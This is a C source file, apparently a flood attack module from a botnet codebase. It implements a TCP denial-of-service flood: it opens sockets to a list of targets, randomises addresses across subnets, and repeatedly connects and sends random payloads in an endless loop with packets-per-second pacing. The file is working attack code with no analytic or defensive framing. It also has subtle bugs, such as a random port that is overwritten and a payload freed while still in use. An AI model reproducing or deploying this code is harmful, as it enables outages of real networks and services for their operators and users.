#define _GNU_SOURCE

#include "../../attack.h"

void send_traffic(int fd, struct flood *flood)
{
    // Randomize payload when data randomization is turned on.
    if (flood->settings->random_data)
    {
        if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
            flood->settings->length = rand_next_range(flood->settings->min_length, flood->settings->max_length);

        flood->settings->payload = (char *)malloc(flood->settings->length);
        rand_str(flood->settings->payload, flood->settings->length);
    }
    
    send(fd, flood->settings->payload, flood->settings->length, MSG_NOSIGNAL);
    
    free(flood->settings->payload);
}

void flood_socket(struct flood *flood)
{
    int i = 0;
    int *fd = calloc(flood->num_of_targets, sizeof(int));

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct flood_target target = flood->targets[i];

        // Randomize destination port
        if (flood->settings->dest_port == 0xffff)
            target.sock_addr.sin_port = rand_next();

        target.sock_addr.sin_port = htons(flood->settings->dest_port);

        // Create socket.
        if ((fd[i] = socket(AF_INET, SOCK_STREAM, 0)) == -1)
            return;

        int error = 0;
        int keepAlive = 1;
        if ((error = setsockopt(fd[i], SOL_SOCKET, SO_KEEPALIVE, &keepAlive, sizeof(keepAlive))) == -1)
            return;

        // Randomize destination address if the netmask is below 32 to add subnet support.
        if (target.netmask < 32)
            target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

        int x;
        for (x = 0; x < flood->settings->repeat; x++)
        {
            connect(fd[i], (struct sockaddr *)&target.sock_addr, sizeof(struct sockaddr_in));
            usleep(flood->settings->csleep * 1000);
        }

        if (!flood->settings->random_data && flood->settings->payload == NULL)
        {
            flood->settings->payload = (char *)malloc(flood->settings->length);
            rand_str(flood->settings->payload, flood->settings->length);
        }
    }

    // Start sending traffic.
    while (1)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            struct flood_target target = flood->targets[i];

         int x;
         for (x = 0; x < flood->settings->repeat; x++)
        {
            connect(fd[i], (struct sockaddr *)&target.sock_addr, sizeof(struct sockaddr_in));
            usleep(flood->settings->csleep * 1000);
        }

            // Randomize destination address if the netmask is below 32 to add subnet support.
            if (target.netmask < 32)
                target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

            // start flood
            if (flood->settings->min_pps > 0 && flood->settings->max_pps > 0)
            {
                int x = 0;
                for (x = 0; x < rand_next_range(flood->settings->min_pps, flood->settings->max_pps); x++) // PPS Limiter
                    send_traffic(fd[i], flood);
                sleep(1);
            }
            else
                send_traffic(fd[i], flood);
            // end flood

            usleep(flood->settings->sleep);
        }
    }
}
